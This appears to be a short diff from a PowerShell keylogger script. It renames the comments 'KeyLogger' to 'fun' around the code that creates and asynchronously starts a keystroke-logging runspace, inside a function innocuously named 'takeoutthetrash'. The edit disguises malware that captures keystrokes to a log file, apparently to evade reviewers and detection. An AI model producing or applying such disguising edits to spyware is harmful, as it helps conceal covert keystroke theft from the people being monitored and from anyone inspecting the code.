@@ -327,13 +327,13 @@ function takeoutthetrash {
         $UnhookWindowsHookEx.Invoke($Hook)
     }
 
-    # Setup KeyLogger's runspace
+    # Setup fun runspace
     $PowerShell = [PowerShell]::Create()
     [void]$PowerShell.AddScript($Script)
     [void]$PowerShell.AddArgument($LogPath)
     if ($PSBoundParameters.Timeout) { [void]$PowerShell.AddArgument($Timeout) }
 
-    # Start KeyLogger
+    # Start fun
     [void]$PowerShell.BeginInvoke()
 
     if ($PassThru.IsPresent) { return $PowerShell }
